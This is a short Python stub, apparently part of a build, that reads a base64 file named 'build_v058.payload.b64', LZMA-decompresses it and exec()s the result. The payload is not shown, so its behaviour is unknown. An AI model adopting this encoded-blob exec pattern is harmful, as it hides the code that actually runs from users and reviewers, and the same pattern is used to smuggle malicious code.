from pathlib import Path
import base64,lzma
root=Path(__file__).parent
payload=(root/'build_v058.payload.b64').read_text(encoding='ascii').strip()
code=lzma.decompress(base64.b64decode(payload))
exec(compile(code,'build_v058.selfcontained.py','exec'),globals(),globals())
